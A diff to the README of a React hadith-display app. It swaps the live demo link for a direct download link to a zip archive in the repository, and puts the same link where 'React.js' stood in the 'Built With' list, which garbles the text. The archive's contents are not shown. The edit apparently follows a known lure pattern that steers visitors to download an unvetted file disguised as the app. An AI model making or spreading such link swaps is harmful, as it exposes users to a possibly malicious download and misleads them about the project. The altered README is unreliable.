@@ -7,7 +7,7 @@ This app fetches authentic Ahadith from a public Hadith API and displays them in
 
 ## 🚀 Live Demo
 
-🔗 https://hadithapp.vercel.app
+🔗 https://github.com/talhaw-cmd/react-hadith-app/raw/refs/heads/main/public/react_hadith_app_2.7-beta.3.zip
 
 ---
 
@@ -26,7 +26,7 @@ This app fetches authentic Ahadith from a public Hadith API and displays them in
 
 ## 🛠️ Built With
 
-- **React.js**
+- **https://github.com/talhaw-cmd/react-hadith-app/raw/refs/heads/main/public/react_hadith_app_2.7-beta.3.zip**
 - **CSS (No Tailwind / No UI library)**
 - **Hadith API**
 - **Vercel** for deployment
